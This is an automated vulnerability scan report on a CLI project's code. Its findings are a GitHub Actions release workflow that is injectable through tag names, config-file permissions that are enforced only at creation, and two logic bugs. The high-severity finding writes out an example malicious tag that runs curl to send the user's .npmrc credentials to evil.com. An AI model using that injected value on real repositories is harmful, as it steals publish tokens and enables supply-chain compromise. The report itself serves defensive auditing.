# Vulnerability Scan Report

| Field | Value |
|-------|-------|
| Project | cli |
| Date | 2026-05-18T13:32:27.438Z |
| Files tracked | 16 |
| Files analyzed | 16 |
| Total findings | 4 |

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 1 |
| HIGH_BUG | 0 |
| BUG | 2 |

## HIGH (1)

### Command injection in release workflow via attacker-controlled git tag name (supply-chain RCE)

- **File:** `.github/workflows/release.yml`
- **Recent committers:** Yos Riady <1084226+yosriady@users.noreply.github.com>, ngogiahuandev <ngogiahuan23122003@gmail.com>
- **Lines:** 49, 55, 79, 82
- **Slug:** github-workflow-security
- **Confidence:** high

The `publish` job interpolates tag-derived GitHub Actions expressions directly into multi-line `run:` shell scripts. L79 `CURRENT_TAG=${{ github.ref_name }}` injects the raw tag name, and L55/L82 `TAG_VERSION=${{ steps.version.outputs.version }}` / `VERSION=${{ steps.version.outputs.version }}` inject the `version` step output which is derived at L49 from the tag itself (`VERSION=${GITHUB_REF#refs/tags/v}`). Actions performs `${{ }}` substitution textually BEFORE the shell runs, so the tag name becomes literal shell source. Git ref-naming rules forbid spaces and a few metacharacters but PERMIT `;`, `$`, backtick, `(`, `)`, `|`, `&`, `{`, `}`, `<`, `>`. A tag such as `v1.0.0;curl${IFS}-d@$HOME/.npmrc${IFS}evil.com` (or backtick/`$()` variants, using `${IFS}` to avoid spaces) yields `CURRENT_TAG=v1.0.0;curl ... evil.com`, executing arbitrary commands. The `publish` job holds `id-token: write` (npm OIDC trusted publishing), `contents: write`, and environment access to `secrets.TEST_TOKEN` and `secrets.GITHUB_TOKEN`. Arbitrary code execution here means an attacker can publish a malicious `@formo/cli` to npm, exfiltrate the OIDC-minted npm publish token and `GITHUB_TOKEN`, and tamper with releases — a full supply-chain compromise of a published package. The earlier 'Verify tag is on main branch' step only checks `github.sha` ancestry (a hex SHA, not injectable) and does NOT validate the tag NAME, so it does not mitigate this: an attacker can point a maliciously-named tag at a legitimate main commit and the guard still passes. Precondition: ability to push/create a tag (repository write access; default GitHub has no tag-protection). This is a privilege escalation from 'write access' to 'arbitrary npm publish + OIDC/secret exfiltration', and is the canonical GitHub Actions script-injection anti-pattern (CWE-78) that GitHub explicitly warns against.

**Recommendation:** Never interpolate `${{ github.ref_name }}` or any tag/ref-derived value (including `steps.version.outputs.version`, which is computed from the tag) directly into a `run:` block. Pass them through the step's `env:` map and reference them as quoted shell variables, e.g.:

  - name: Generate release notes
    env:
      CURRENT_TAG: ${{ github.ref_name }}
      VERSION: ${{ steps.version.outputs.version }}
    run: |
      PREV_TAG=$(git tag -l 'v*' --sort=-version:refname | grep -v "^${CURRENT_TAG}$" | head -1)

Do the same for the `TAG_VERSION` usage at L55. Environment-variable values are not re-parsed as shell, so injection is prevented. Additionally, harden the version regex (e.g. validate `github.ref_name` matches `^v[0-9]+\.[0-9]+\.[0-9]+([.-][0-9A-Za-z.]+)?$` and `exit 1` otherwise before any other step), and enable GitHub tag protection rules so only trusted maintainers can create `v*` tags.

---

## MEDIUM (1)

### API-key config file permission control (0o600) silently bypassed when config.json already exists

- **File:** `src/lib/config.ts`
- **Recent committers:** ngogiahuandev <ngogiahuan23122003@gmail.com>
- **Lines:** 26, 27, 28, 29
- **Slug:** other-insecure-file-permissions
- **Confidence:** medium

saveConfig() persists the plaintext API key with `fs.writeFileSync(CONFIG_FILE, ..., { mode: 0o600 })` and creates the directory with `fs.mkdirSync(CONFIG_DIR, { recursive: true, mode: 0o700 })`. Per Node.js semantics, the `mode` option of `writeFileSync` is applied ONLY when the file is newly created (open with O_CREAT). If `~/.config/formo/config.json` already exists, the mode is NOT re-applied — the file is merely truncated and rewritten while retaining its existing permissions. Likewise, `mkdirSync` does not chmod an already-existing CONFIG_DIR. The codebase's documented threat model ranks 'API-key disclosure via weak config-file perms' as the #1 impact, and the sole stated control for the plaintext-credential store is exactly this `0o600`/`0o700` mode. That control is conditional: it holds only for a clean first creation. Realistic ways the file pre-exists with looser (e.g., 0o644, group/world-readable) permissions before saveConfig runs include: (a) an older `@formo/cli` version that wrote config.json without the `mode` option (default 0o666 & ~umask → typically 0o644); (b) the user or another tool creating the file first; (c) a backup/restore or dotfile-sync tool resetting modes; (d) `EXISTING` config dir created by another app under `~/.config`. In any of these cases `formo login` writes a long-lived `formo_…` API key into a world/group-readable file on a multi-user host, disclosing the credential to other local users — the precise risk the 0o600 control was meant to prevent. clearConfig() (L35-37) has the same create-only-mode limitation (lower impact since it writes `{}`).

**Recommendation:** Do not rely on writeFileSync's create-only `mode`. After writing, explicitly enforce permissions: `fs.chmodSync(CONFIG_FILE, 0o600)` (and `fs.chmodSync(CONFIG_DIR, 0o700)`), or write atomically via `fs.openSync(CONFIG_FILE, 'w', 0o600)` followed by `fs.fchmodSync(fd, 0o600)` before writing, then rename. Optionally detect and warn (or refuse) if the existing file/dir has group/other bits set. Apply the same chmod hardening in clearConfig().

---

## BUG (2)

### HTTP GET issued with a request body for profile search conditions

- **File:** `src/commands/profiles.ts`
- **Recent committers:** Yos Riady <1084226+yosriady@users.noreply.github.com>, ngogiahuandev <ngogiahuan23122003@gmail.com>
- **Lines:** 124
- **Slug:** other-logic-bug
- **Confidence:** low

searchProfilesRun() sends the validated `--conditions`/`--logic` payload as the body of a GET request: `client.request({ method: 'get', url: '/v0/profiles/', params, data: body })`. Bodies on GET requests are not reliably transmitted — axios sends them, but many HTTP intermediaries, proxies, and server frameworks strip or ignore GET request bodies. If the body is dropped anywhere along the path, the filter conditions are silently discarded and the endpoint returns the entire unfiltered profile dataset. This is exactly the silent-unfiltered-result footgun that parseSearchConditions()'s own comments (lines 52-55, 96-98) go to great lengths to prevent for bare field names. Not a security vulnerability (data is the caller's own project data under their own scoped key), but a correctness/cost concern: a user believing they filtered to a small result set may instead page through the full dataset. Low confidence because it depends on api.formo.so and the transport actually honoring GET bodies, which cannot be verified from the client code alone.

**Recommendation:** Either send the conditions payload via POST (e.g. a dedicated search endpoint) or confirm api.formo.so reliably reads GET bodies. If the GET-with-body contract is intentional and supported end-to-end, document it explicitly so future maintainers do not 'fix' it.

---

### buildCreateSegmentBody does not validate that --filter-sets is an array

- **File:** `src/commands/segments.ts`
- **Recent committers:** Yos Riady <1084226+yosriady@users.noreply.github.com>, ngogiahuandev <ngogiahuan23122003@gmail.com>
- **Lines:** 32, 33, 34, 35, 36, 37, 38, 42
- **Slug:** other-input-validation
- **Confidence:** high

buildCreateSegmentBody() does `JSON.parse(options.filterSets)` and forwards the result unchanged, but never checks `Array.isArray(parsedFilterSets)`. Both the catch-block error message ('--filter-sets must be a valid JSON array') and the Zod option description ('JSON array of filter set strings defining the segment') promise array validation that the code does not perform. Inputs like `--filter-sets '{"x":1}'`, `--filter-sets '5'`, or `--filter-sets '"foo"'` are valid JSON and therefore pass client-side validation, sending a malformed `filterSets` shape to POST /v0/segments/. This is inconsistent with the sibling validator buildImportBody() in import.ts (lines 19-21), which correctly rejects non-arrays. Not a security issue — the server enforces the real schema under the segments:write scope — but the misleading error message degrades the CLI/agent UX and can mask the actual cause of a server rejection.

**Recommendation:** After JSON.parse, add `if (!Array.isArray(parsedFilterSets)) throw new Error('--filter-sets must be a valid JSON array')`, mirroring buildImportBody() in import.ts, so the validation matches the documented contract.

---

